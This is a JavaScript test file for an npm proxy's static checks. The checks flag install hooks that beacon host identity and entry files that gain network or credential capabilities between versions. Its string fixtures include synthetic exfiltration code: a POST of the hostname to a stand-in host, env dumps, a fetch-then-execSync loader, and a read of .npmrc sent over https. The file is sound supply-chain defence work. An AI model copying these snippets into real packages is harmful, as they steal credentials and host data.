// 0.1.5 static checks S6 and S7 (operator rulings R2 and R3 2026-10-21), both CONTRIBUTING first, against the held copy of the
// vocabulary (to be aligned to recon's static-checks-1.4 constants when they arrive; the version string stays held, R5).
//   S6 network-only-beacon        a hook target with an API network sink (http-request, fetch, net-connect, websocket, xhr, axios), a
//                                 host-identity source (os.hostname(), os.userInfo(), os.networkInterfaces(), the env-dump marker, or
//                                 USER, USERNAME, LOGNAME, HOSTNAME, COMPUTERNAME read from process.env) and NO execution sink in the
//                                 same file; url-literal is not a sink, a bare process.env read is not a source
//   S7 entry-capability-delta     main or bin gains an API network sink, an execution sink, an obfuscation or decode marker, or a
//                                 credential source that the predecessor's same-role file lacked (url-literal excluded); predecessor =
//                                 the last version this proxy served (witness.db entry facts, R4); cold start NOT_APPLICABLE; a refused
//                                 or unread predecessor or current file is NOT_CHECKED, never a clean delta; the row names the predecessor
// Failing first: written before the code. Tarballs are synthetic; nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { createProxyServer } from '../../proxy/server.js';
import { resetDependencyCache } from '../../gates/dependency-cache.js';
import { forgetManifestHooks } from '../../proxy/manifest-check.js';
import { withRole } from '../../gates/row-class.js';

const SC = () => import('../../proxy/static-checks.js');
const S6 = 'static:S6-network-only-beacon'; const S7 = 'static:S7-entry-capability-delta';

const H = 3_600_000; const T0 = Date.parse('2026-03-01T00:00:00Z'); const at = (h) => new Date(T0 + h * H).toISOString();
function hdr(name, size) {
  const h = Buffer.alloc(512, 0); Buffer.from(name, 'utf8').copy(h, 0, 0, 100);
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116); h.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 'latin1');
  h.write('00000000000\0', 136); h.write('        ', 148); h.write('0', 156, 'latin1'); h.write('ustar\0', 257, 'latin1'); h.write('00', 263, 'latin1');
  let sum = 0; for (let i = 0; i < 512; i += 1) sum += h[i]; h.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 'latin1'); return h;
}
const pad = (b) => Buffer.concat([b, Buffer.alloc((512 - (b.length % 512)) % 512, 0)]);
const tgz = (files) => zlib.gzipSync(Buffer.concat([...Object.entries(files).flatMap(([p, c]) => [hdr(`package/${p}`, Buffer.byteLength(c)), pad(Buffer.from(c))]), Buffer.alloc(1024, 0)]));
const BENIGN = 'module.exports = 1;\n';
const BEACON = 'const os = require("os");\nfetch("https://collect.example.invalid/b", { method: "POST", body: os.hostname() });\n';
const BEACON_ENV = 'const https = require("https");\nhttps.request({ host: "h" }).end(process.env.USERNAME);\n';
const BEACON_DUMP = 'const https = require("https");\nhttps.request({ host: "h" }).end(JSON.stringify(process.env));\n';
const LOADER = 'const https = require("https"); const cp = require("child_process");\nhttps.get("https://x.example.invalid/s", (r) => cp.execSync("x"));\nrequire("os").hostname();\n';
const URL_ONLY = 'const u = "https://collect.example.invalid/b"; module.exports = require("os").hostname() + u;\n';
const HOME_ONLY = 'fetch("https://x.example.invalid/", { body: process.env.HOME });\n';
const NETTY = 'const https = require("https");\nhttps.request({ host: "h" }).end(require("fs").readFileSync(".npmrc", "utf8"));\n';

const file = (p, s) => ({ path: p, buf: Buffer.from(s) });
const walkOf = (files, notKept = []) => ({ ok: true, files, notKept });
const rowOf = (rows, gate) => rows.find((r) => r.gate === gate);
const hookMan = { name: 'h', version: '1.0.0', scripts: { postinstall: 'node install.js' } };
const pred = (version, files, extra = {}) => ({ version, served_at: at(0), walk: 'read', reason: null, static_checks_version: undefined, files, ...extra });
const readEntry = (role, p, facts) => ({ role, path: p, state: 'read', size_bytes: 20, sha256: 'x', facts, reason: null });
const NOFACTS = { binary: false, net_sinks: [], exec_sinks: [], obf_idents: 0, decode_markers: [], hex_density: 0, numeric_hex: 0, cred_sources: [], sinks: [], overrides: [], address_families: [], identity_sources: [] };

// ------------------------------------------------------------------ the check list and the roles
test('S67-U1 eight static checks S0-S7; S6 and S7 are contributing (their WARN is recorded as NOTE); "not armed" covers all eight', async () => {
  const S = await SC();
  assert.deepEqual(S.CHECKS.map((c) => c.id), ['S0', 'S1', 'S2', 'S3', 'S4', 'S5', 'S6', 'S7']);
  assert.ok(S.STATIC_GATES.includes(S6) && S.STATIC_GATES.includes(S7));
  assert.equal(withRole({ gate: S6, result: 'WARN', detail: 'x' }).result, 'NOTE');
  assert.equal(withRole({ gate: S7, result: 'WARN', detail: 'x' }).result, 'NOTE');
  assert.equal(S.unarmedRows('why').length, 8);
  const six = S.CHECKS.slice(0, 6).map((c) => ({ gate: c.gate, result: 'ALLOW', detail: 'x' }));
  assert.equal(S.staticSettled({ gates_fired: six }), false, 'a record from before S6 and S7 is retried when a later download is armed');
});

// ------------------------------------------------------------------ S6 over hook targets (R2)
test('S67-U2 S6 fires on a hook target with an API network sink, a host-identity source and no execution sink', async () => {
  const S = await SC();
  for (const body of [BEACON, BEACON_ENV, BEACON_DUMP]) {
    const r = rowOf(S.staticRows({ manifest: hookMan, walk: walkOf([file('install.js', body)]), armed: 'identity-break' }), S6);
    assert.equal(r?.result, 'WARN', `${body}: ${JSON.stringify(r)}`);
    assert.match(r.detail, /^hook target install\.js \(\d+ B\) has a network sink \([^)]+\) and a host-identity source \([^)]+\) and no execution sink; armed by identity-break$/);
  }
});

test('S67-U3 S6 does not fire: an execution sink in the same file (S1 territory), url-literal as the only sink, a bare process.env read, or an entry file', async () => {
  const S = await SC();
  const s6 = (man, files) => rowOf(S.staticRows({ manifest: man, walk: walkOf(files), armed: 'identity-break' }), S6);
  assert.equal(s6(hookMan, [file('install.js', LOADER)]).result, 'ALLOW');
  assert.equal(s6(hookMan, [file('install.js', URL_ONLY)]).result, 'ALLOW', 'url-literal is not a sink');
  assert.equal(s6(hookMan, [file('install.js', HOME_ONLY)]).result, 'ALLOW', 'process.env.HOME is not a host-identity source');
  const r = s6({ name: 'h', main: 'index.js' }, [file('index.js', BEACON)]);
  assert.equal(r.result, 'ALLOW'); assert.match(r.detail, /^no hook target to read/);
});

// ------------------------------------------------------------------ S7 against the stored predecessor (R3)
const mainMan = { name: 'm', version: '1.1.0', main: 'index.js' };
test('S67-U4 S7 cold start: no earlier version served by this proxy is NOT_APPLICABLE, stated, never a clean delta', async () => {
  const S = await SC();
  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'entry-path-change', predecessor: null }), S7);
  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not applicable: no earlier version served by this proxy; armed by entry-path-change');
});

test('S67-U5 S7 fires when main gains capabilities the predecessor\'s main lacked; the row names the predecessor version', async () => {
  const S = await SC();
  const p = pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]);
  const r = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'entry-path-change', predecessor: p }), S7);
  assert.equal(r.result, 'WARN', JSON.stringify(r));
  assert.equal(r.detail, 'main index.js gains a network sink (http-request) and a credential source (npmrc) against 1.0.0, the version served before; armed by entry-path-change');
});

test('S67-U6 S7 does not fire on the same capabilities or on url-literal alone', async () => {
  const S = await SC();
  const had = pred('1.0.0', [readEntry('main', 'index.js', { ...NOFACTS, net_sinks: ['http-request'], cred_sources: ['npmrc'] })]);
  const same = rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', NETTY)]), armed: 'x', predecessor: had }), S7);
  assert.equal(same.result, 'ALLOW'); assert.equal(same.detail, 'entry files gain no capability against 1.0.0, the version served before (1 file compared); armed by x');
  const none = pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]);
  assert.equal(rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', URL_ONLY)]), armed: 'x', predecessor: none }), S7).result, 'ALLOW', 'url-literal excluded');
});

test('S67-U7 S7 NOT_CHECKED: a refused predecessor archive, an unread predecessor or current file, or facts from another static-checks version', async () => {
  const S = await SC();
  const s7 = (p, walk = walkOf([file('index.js', NETTY)])) => rowOf(S.staticRows({ manifest: mainMan, walk, armed: 'x', predecessor: p }), S7);
  let r = s7(pred('1.0.0', [], { walk: 'refused', reason: 'tar: truncated archive' }));
  assert.equal(r.result, 'SKIP'); assert.equal(r.detail, 'not checked: the archive of 1.0.0, the version served before, was refused (tar: truncated archive); armed by x');
  r = s7(pred('1.0.0', [{ role: 'main', path: 'index.js', state: 'not-read', size_bytes: 2_000_000, sha256: null, facts: null, reason: 'over the kept-file cap (1048576 bytes)' }]));
  assert.equal(r.result, 'SKIP'); assert.match(r.detail, /^not checked: main index\.js of 1\.0\.0 was not read \(over the kept-file cap/);
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)]), walkOf([], [{ path: 'index.js', reason: 'over the kept-file cap (1048576 bytes)', size: 2_000_000 }]));
  assert.equal(r.result, 'SKIP'); assert.match(r.detail, /^not checked: main index\.js was not read \(over the kept-file cap/);
  r = s7(pred('1.0.0', [readEntry('main', 'index.js', NOFACTS)], { static_checks_version: 'static-checks-0.9' }));
  assert.equal(r.result, 'SKIP'); assert.match(r.detail, /^not checked: the facts of 1\.0\.0 were stored by static-checks-0\.9/);
});

// ------------------------------------------------------------------ end to end: the predecessor is the last version this proxy served
// e: nine versions; 1.7.0 keeps index.js (benign); 1.8.0 moves main to lib/run.js, which sends .npmrc out -> entry-path-change arms
const EV = Array.from({ length: 9 }, (_, i) => `1.${i}.0`);
const REAL = (name, v) => ({ _npmUser: { name: 'maintainer', email: 'm@example.com' }, _npmVersion: '10.9.2',
  dist: { shasum: `shasum-${name}-${v}`, integrity: `sha512-${name}-${v}==`, tarball: `https://registry.npmjs.org/${name}/-/${name}-${v}.tgz`, unpackedSize: 1000 } });
const E = { name: 'e', 'dist-tags': { latest: '1.8.0' }, time: Object.fromEntries(EV.map((v, i) => [v, at(48 * i)])),
  versions: Object.fromEntries(EV.map((v) => [v, { name: 'e', version: v, main: v === '1.8.0' ? 'lib/run.js' : 'index.js', ...REAL('e', v) }])) };
const DOCS = { '/e': E };
const TARBALLS = {
  '/e/-/e-1.7.0.tgz': tgz({ 'package.json': JSON.stringify(E.versions['1.7.0']), 'index.js': BENIGN }),
  '/e/-/e-1.8.0.tgz': tgz({ 'package.json': JSON.stringify(E.versions['1.8.0']), 'lib/run.js': NETTY }),
};
async function withProxy(fn) {
  resetDependencyCache(); forgetManifestHooks();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s67-'));
  const upstream = http.createServer((req, res) => {
    const u = decodeURIComponent(req.url.split('?')[0]);
    if (TARBALLS[u]) { res.writeHead(200, { 'content-type': 'application/octet-stream' }); res.end(TARBALLS[u]); return; }
    if (DOCS[u]) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DOCS[u])); return; }
    res.writeHead(404, { 'content-type': 'application/json' }); res.end('{}');
  });
  await new Promise((r) => upstream.listen(0, '127.0.0.1', r));
  const proxy = createProxyServer({ port: 0, host: '127.0.0.1', upstream: `http://127.0.0.1:${upstream.address().port}`,
    witnessDbPath: path.join(dir, 'witness.db'), headersTimeoutMs: 10_000, bodyTimeoutMs: 10_000 });
  await new Promise((r) => proxy.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${proxy.address().port}`;
  try { return await fn({ base, proxy }); } finally {
    await new Promise((r) => proxy.close(r)); await new Promise((r) => upstream.close(r)); fs.rmSync(dir, { recursive: true, force: true });
    resetDependencyCache(); forgetManifestHooks();
  }
}
const get = (u) => new Promise((resolve, reject) => http.get(u, { agent: false }, (res) => {
  const chunks = []; res.on('data', (x) => chunks.push(x)); res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
}).on('error', reject));
const settle = () => new Promise((r) => setTimeout(r, 200));

test('S67-E1 S7 end to end: 1.7.0 served first, then 1.8.0 (armed by entry-path-change) records S7 as NOTE against 1.7.0', async () => {
  await withProxy(async ({ base, proxy }) => {
    await get(`${base}/e`); await get(`${base}/e`);
    await get(`${base}/e/-/e-1.7.0.tgz`); await settle();
    await get(`${base}/e/-/e-1.8.0.tgz`); await settle();
    const r = proxy.witnessDb.getLatestDecision('e', '1.8.0').gates_fired.find((g) => g.gate === S7);
    assert.equal(r?.result, 'NOTE', JSON.stringify(r));
    assert.equal(r.detail, 'main lib/run.js gains a network sink (http-request) and a credential source (npmrc) against 1.7.0, the version served before; armed by entry-path-change');
  });
});

test('S67-E2 the predecessor is the version served BEFORE: a version served later is never the predecessor of one served earlier', async () => {
  const { openWitnessDB } = await import('../../witness/db.js');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cft015-s67db-'));
  const db = openWitnessDB(path.join(dir, 'w.db')); db.applySchema();
  try {
    const rec = (v) => db.recordEntryFacts({ package_name: 'a', version: v, walk: 'read', reason: null, static_checks_version: 'x', files: [] });
    rec('1.0.0'); rec('1.1.0'); rec('1.2.0');
    assert.equal(db.predecessorEntryFacts('a', '1.1.0').version, '1.0.0');
    assert.equal(db.predecessorEntryFacts('a', '1.0.0'), null);
    assert.equal(db.predecessorEntryFacts('a', '1.3.0').version, '1.2.0', 'a version not yet stored: the last one served');
  } finally { db.close(); fs.rmSync(dir, { recursive: true, force: true }); }
});
